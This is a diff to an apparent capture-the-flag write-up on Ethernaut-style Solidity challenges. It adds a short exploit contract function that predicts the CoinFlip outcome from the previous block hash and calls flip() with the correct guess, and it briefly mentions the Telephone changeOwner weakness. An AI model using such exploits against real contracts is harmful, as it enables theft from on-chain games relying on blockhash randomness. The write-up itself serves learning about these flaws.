@@ -53,6 +53,17 @@ We need to pass this condition 10 times :  `if (side == _guess) {` but side depe
 coinFlip = uint256(blockhash(block.number - 1)) / FACTOR  </br>
 where FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
+<br/> for that reason we are going to create a contract pointing instance of the deployed Coinflip and recreate flip function to generate the guess value.
+```solidity
+function flipGuess() external {
+    uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+    uint256 division = blockValue / factor;
+    bool guess = division == 1 ? true : false;
+    coinFlipContract.flip(guess);
+}
+```
+
 ### Telephone
 In the contract Telephone the function changeOwner is public and can be invoked fron any contrac
 
